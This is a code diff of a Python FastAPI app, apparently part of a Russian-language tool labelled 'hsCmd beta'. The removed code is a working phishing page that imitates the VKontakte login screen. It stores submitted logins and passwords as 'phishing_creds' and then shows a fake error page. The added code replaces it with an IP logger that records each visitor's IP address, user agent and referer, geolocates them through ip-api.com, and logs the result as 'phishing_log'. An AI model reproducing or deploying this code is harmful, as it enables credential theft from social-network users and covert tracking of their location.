@@ -1,90 +1,143 @@
-from fastapi import FastAPI, Request, Form
+from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse
 import datetime
 import json
 import db
+import aiohttp
 
 app = FastAPI()
 
 @app.get("/log")
-async def log_get(request: Request):
-    # Собираем базовые данные (IP, User-Agent, реферер) при заходе
+async def log_report(request: Request):
     client_ip = request.client.host
     user_agent = request.headers.get("user-agent", "unknown")
     referer = request.headers.get("referer", "none")
+
+    # Получаем геоданные через ip-api.com
     geo = {}
     try:
-        import aiohttp
         async with aiohttp.ClientSession() as session:
-            async with session.get(f"http://ip-api.com/json/{client_ip}?fields=country,regionName,city,isp", timeout=5) as resp:
+            async with session.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as", timeout=5) as resp:
                 geo = await resp.json()
     except:
-        pass
-    log_data = {
+        geo = {"status": "fail", "message": "Не удалось определить"}
+
+    # Сохраняем в БД
+    log_entry = {
         "ip": client_ip,
         "user_agent": user_agent,
         "referer": referer,
         "geo": geo,
         "time": datetime.datetime.now().isoformat()
     }
-    db.add_log(user_id=0, action="phishing_log", query=client_ip, result=json.dumps(log_data, ensure_ascii=False))
+    db.add_log(user_id=0, action="phishing_log", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))
 
-    # Отдаём HTML-страницу с формой
-    html = """
+    # Готовим данные для отображения
+    if geo.get("status") == "success":
+        country = geo.get("country", "—")
+        region = geo.get("regionName", "—")
+        city = geo.get("city", "—")
+        isp = geo.get("isp", "—")
+        org = geo.get("org", "—")
+        lat = geo.get("lat", "—")
+        lon = geo.get("lon", "—")
+    else:
+        country = region = city = isp = org = lat = lon = "—"
+
+    html = f"""
     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Вход в ВК</title>
+        <title>Ваш отчёт</title>
         <style>
-            body { background: #e5ebf1; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-            .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); width: 360px; }
-            .login-box img { display: block; margin: 0 auto 20px; width: 80px; }
-            .login-box h2 { text-align: center; color: #2c3e50; }
-            .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-            .login-box button { width: 100%; padding: 10px; background: #4a76a8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
-            .login-box button:hover { background: #3a5f85; }
-            .error { color: red; text-align: center; margin-top: 10px; }
+            body {{
+                background: #f0f2f5;
+                font-family: 'Segoe UI', Arial, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                margin: 0;
+                padding: 20px;
+            }}
+            .report {{
+                background: white;
+                border-radius: 12px;
+                padding: 40px 50px;
+                max-width: 600px;
+                width: 100%;
+                box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+                border-left: 6px solid #4a76a8;
+            }}
+            h1 {{
+                color: #2c3e50;
+                margin-top: 0;
+                font-weight: 500;
+                font-size: 26px;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+            }}
+            .info {{
+                margin: 20px 0;
+                border-bottom: 1px solid #eee;
+                padding: 12px 0;
+                display: flex;
+                justify-content: space-between;
+            }}
+            .label {{
+                font-weight: 600;
+                color: #555;
+            }}
+            .value {{
+                color: #222;
+                word-break: break-word;
+                text-align: right;
+                max-width: 60%;
+            }}
+            .badge {{
+                background: #4a76a8;
+                color: white;
+                padding: 4px 12px;
+                border-radius: 20px;
+                font-size: 14px;
+                display: inline-block;
+            }}
+            .footer {{
+                margin-top: 30px;
+                font-size: 13px;
+                color: #888;
+                text-align: center;
+                border-top: 1px solid #eee;
+                padding-top: 15px;
+            }}
+            @media (max-width: 500px) {{
+                .report {{ padding: 20px; }}
+                .info {{ flex-direction: column; align-items: flex-start; gap: 5px; }}
+                .value {{ text-align: left; max-width: 100%; }}
+            }}
         </style>
     </head>
     <body>
-        <div class="login-box">
-            <img src="https://vk.com/images/icons/favicons/favicon_vk_256.ico" alt="VK">
-            <h2>Вход в ВКонтакте</h2>
-            <form action="/log" method="POST">
-                <input type="text" name="login" placeholder="Телефон или email" required>
-                <input type="password" name="password" placeholder="Пароль" required>
-                <button type="submit">Войти</button>
-            </form>
-            <div class="error">⚠️ Если у вас проблемы со входом, попробуйте позже.</div>
-        </div>
-    </body>
-    </html>
-    """
-    return HTMLResponse(content=html, status_code=200)
-
-@app.post("/log")
-async def log_post(login: str = Form(...), password: str = Form(...), request: Request = None):
-    # Сохраняем введённые данные
-    client_ip = request.client.host if request else "unknown"
-    log_entry = {
-        "login": login,
-        "password": password,
-        "ip": client_ip,
-        "time": datetime.datetime.now().isoformat()
-    }
-    db.add_log(user_id=0, action="phishing_creds", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))
-    # Возвращаем страницу с ошибкой (имитация)
-    html = """
-    <!DOCTYPE html>
-    <html>
-    <head><meta charset="UTF-8"><title>Ошибка</title></head>
-    <body style="background:#e5ebf1;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;">
-        <div style="background:white;padding:40px;border-radius:10px;text-align:center;">
-            <h2 style="color:red;">Неверный логин или пароль</h2>
-            <p>Пожалуйста, попробуйте снова.</p>
-            <a href="/log">Вернуться на страницу входа</a>
+        <div class="report">
+            <h1>
+                <span>📡</span> Отчёт о подключении
+                <span class="badge">{datetime.datetime.now().strftime("%H:%M")}</span>
+            </h1>
+            <div class="info"><span class="label">🌐 IP-адрес</span><span class="value"><code>{client_ip}</code></span></div>
+            <div class="info"><span class="label">📍 Страна</span><span class="value">{country}</span></div>
+            <div class="info"><span class="label">🏙️ Регион / Город</span><span class="value">{region}, {city}</span></div>
+            <div class="info"><span class="label">🧭 Координаты</span><span class="value">{lat}, {lon}</span></div>
+            <div class="info"><span class="label">🏢 Провайдер (ISP)</span><span class="value">{isp}</span></div>
+            <div class="info"><span class="label">📋 Организация</span><span class="value">{org}</span></div>
+            <div class="info"><span class="label">🖥️ User‑Agent</span><span class="value" style="font-size:12px;">{user_agent}</span></div>
+            <div class="info"><span class="label">⏱️ Время запроса</span><span class="value">{datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</span></div>
+            <div class="footer">
+                Данные сохранены в лог-файл.<br>
+                <span style="color:#aaa;">hsCmd beta — технический отчёт</span>
+            </div>
         </div>
     </body>
     </html>
